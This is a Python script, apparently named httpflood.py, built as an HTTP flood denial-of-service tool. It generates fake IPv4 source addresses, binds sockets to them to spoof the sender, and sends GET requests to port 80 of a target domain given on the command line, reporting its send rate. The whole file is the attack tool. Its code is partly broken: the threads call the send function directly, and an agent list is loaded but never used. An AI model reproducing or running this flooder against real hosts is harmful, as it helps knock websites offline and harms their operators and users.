from scapy.all import *
import socket
from faker import Faker
import threading
from random import *
import sys
import time

def load_agents(name):
        agentlist = []
        with open(name, 'r') as file:
              for i in file.readlines():
                    agentlist.append(i)
        return agentlist

def error(message):
        sys.exit(message)


def sendsocket(src, dst):
        port = 80
        try:
                dst = socket.gethostbyname(dst)
        except Exception:
                error('Input a valid FQDN')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((src, RandShort())) 
        s.connect((dst, port))
        s.sendto((f"GET / {dst} HTTP/1.1\r\nHost: {src} \r\n\r\n").encode('utf-8'), (dst, port))
        s.close()


def flood(dst, packets, alist):
        fake = Faker()
        addrs = []
        # packetlist = []
        proctime = time.process_time()
        print('generating fake ipv4 addresses...')
        for i in range(0, packets+1):
                s = fake.ipv4()
                addrs.append(s)

        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')

        print('sending packets')
        for i in range(0, packets+1):
                s = threading.Thread(target= sendsocket(addrs[i], dst))
                s.start()
                print(str(round((i/packets)*100, 2))+" %" +" done...", end='\r')
        proctime = time.process_time()-proctime
        print(f'Done in {proctime} sec')
        print(f'Sent {packets} packets at a rate of {round(packets/proctime, 2)} packets/sec')       



# src = str(input('src: '))
agents = load_agents('agents.txt')
if len(sys.argv) != 3:
        print("USAGE:httpflood.py <FQDN> <number of packets>")
        sys.exit(1)

dst = sys.argv[1]
packets = sys.argv[2]
try:
        packets = int(packets)
except:
        error('Invalid number of packets')

flood(dst, packets, agents)